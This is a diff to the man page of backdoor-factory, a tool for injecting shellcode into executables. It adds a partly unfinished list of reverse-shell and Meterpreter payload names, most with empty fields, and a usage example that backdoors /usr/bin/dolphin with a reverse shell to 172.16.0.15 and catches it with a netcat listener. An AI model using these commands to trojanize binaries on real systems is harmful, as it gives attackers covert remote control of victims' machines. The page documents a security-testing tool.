@@ -2,7 +2,7 @@
 % Philippe Thierry
 % May 2017
 # NAME
-backdoor-factory - 
+backdoor-factory - inject predefined or user-defined shellcode in binaries
 
 # SYNOPSIS
 **backdoor-factory [options]**
@@ -113,24 +113,104 @@ This tool is for security professionals and researchers only.
   EXPERIMENTAL By default a new Import Directory Table is created in a new section, by calling this flag it will be put in a code cave.  This can cause bianry failure is some cases. Test on target binaries first.
 
 **-C**, **--code_sign**
-  For those with codesigning certs wishing to sign PE binaries only. Name your signing key and private key signingcert.cer and signingPrivateKey.pem repectively in the certs directory it's up to you to obtain signing certs.
+  For those with codesigning certs wishing to sign PE binaries only. Name your signing key and private key signingcert.cer and signingPrivateKey.pem respectively in the certs directory it's up to you to obtain signing certs.
 
 **-p**, **--preprocess**
   To execute preprocessing scripts in the preprocess directory
+
+# TITLE TO DEFINE
+
+List of Intel shellcodes (by name)
+
+## for all intel-based (x86 and x86_64 architecture)
+
+**reverse_shell_tcp**
+  need:
+  permits: remote shell access
+
+**delay_reverse_shell_tcp**
+  need:
+  permits:
+
+**beaconing_reverse_shell_tcp**
+  need:
+  permits:
+
+**user_supplied_shellcode**
+  need:
+  permits:
+
+## Linux specific shellcodes
+
+**reverse_tcp_stager**
+  need:
+  permits:
+
+## Windows PE32 exe shellcodes
+
+**reverse_shell_tcp_inline**
+  needs:
+  permits:
+
+**reverse_shell_tcp_stager_threaded**
+  needs:
+  permits:
+
+**meterpreter_reverse_https_threaded**
+  needs:
+  permits:
+
+**user_applied_shellcode_threaded**
+  needs:
+  permits:
+
+**iat_reverse_tcp_inline**
+  needs:
+  permits:
+
+**iat_reverse_tcp_inline_threaded**
+  needs:
+  permits:
+
+**iat_reverse_tcp_stager_threaded**
+  needs:
+  permits:
+
+**iat_user_applied_shellcode_threaded**
+  needs:
+  permits:
+
+## Windows PE64 exe shellcodes
+
+**delay_reverse_shell_tcp**
+  needs:
+  permits:
+
+**reverse_shell_tcp**
+  needs:
+  permits:
+
+**beaconing_reverse_shell_tcp**
+  needs:
+  permits:
+
+**user_supplied_shellcode**
+  needs:
+  permits:
 
 # EXAMPLES
 
 Example of cavecoding an ELF binary, by integrating a remote shell access
 through a remote TCP listener (e.g. netcat):
 
-backdoor-factory -f /usr/bin/dolphin -H 172.16.0.15 -P 8080 -s reverse_shell_tcp
+`backdoor-factory -f /usr/bin/dolphin -H 172.16.0.15 -P 8080 -s reverse_shell_tcp`
 
 On the host behind the IP 172.16.0.15, start netcat in listen mode:
 
-$ netcat -l 172.16.0.15 8080
+`$ netcat -l 172.16.0.15 8080`
 
 On the target, start the backdoored binary:
-./backdoored/dolphin
+`./backdoored/dolphin`
 
 Now, on the host 172.16.0.15, just use your shell.
 
